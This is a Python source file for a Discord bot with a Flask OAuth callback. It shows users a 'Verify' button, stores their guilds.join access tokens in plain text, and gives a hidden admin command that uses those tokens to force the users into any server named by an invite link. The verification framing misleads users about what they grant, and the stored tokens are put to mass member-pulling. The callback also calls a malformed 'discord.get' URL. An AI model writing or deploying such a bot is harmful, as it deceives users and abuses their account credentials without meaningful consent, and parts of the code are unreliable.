import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users.json'

def load_users():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return {}
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    u_str = str(user_id)
    if u_str not in users:
        users[u_str] = {"token": token, "guilds": []}
    if guild_id and str(guild_id) not in users[u_str]["guilds"]:
        users[u_str]["guilds"].append(str(guild_id))
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

# --- Discord Bot Setup ---
class AdminControlView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    @discord.ui.button(label="魔法の入力メニューを開く ✨", style=discord.ButtonStyle.premium)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ADMIN_USER_ID:
            modal = MemberModal()
            await interaction.response.send_modal(modal)
        else:
            await interaction.response.send_message("管理者専用だよっ！", ephemeral=True)

class MemberModal(discord.ui.Modal, title='メンバー追加魔法'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx')
    count = discord.ui.TextInput(label='参加させる人数', placeholder='半角数字')
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
            if res.status_code != 200:
                return await interaction.followup.send("招待リンクが無効だよ", ephemeral=True)
            target_guild_id = res.json().get('guild', {}).get('id')
            users = load_users()
            user_ids = list(users.keys())[:target_count]
            success = 0
            for u_id in user_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{u_id}'
                headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
                r = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
                if r.status_code in [201, 204]: success += 1
            await interaction.followup.send(f"🌸 {success}人の追加に成功したよ！", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"エラー: {e}", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
    url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Verify (認証するっ！)", url=url, style=discord.ButtonStyle.link))
    await interaction.response.send_message("🌸 下のボタンから認証してね", view=view)

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        await ctx.send("🔐 管理者メニュー:", view=AdminControlView(), delete_after=60)

# --- Flask & デバッグCallback ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    if not code:
        return "認証コードがありません", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    # 🚨 ここで詳細なエラーをキャッチ
    res = requests.post('https://discord.com/api/oauth2/token', data=data)
    
    try:
        token_json = res.json()
    except:
        # JSONじゃない（エラーページ等）が返ってきた場合
        return f"<h3>Discordからの応答が不正です</h3><p>Status: {res.status_code}</p><p>Response: {res.text}</p><hr><p><b>ヒント:</b> REDIRECT_URIがPortalと一致しているか、CLIENT_SECRETが正しいか確認してください。</p>"

    if 'access_token' not in token_json:
        return f"<h3>トークン取得エラー</h3><pre>{json.dumps(token_json, indent=2)}</pre>"

    access_token = token_json['access_token']
    u_info = requests.get('https://discord.get/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    
    save_user(u_info['id'], access_token, guild_id)

    return "<h1>認証成功っ！🌸</h1>"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)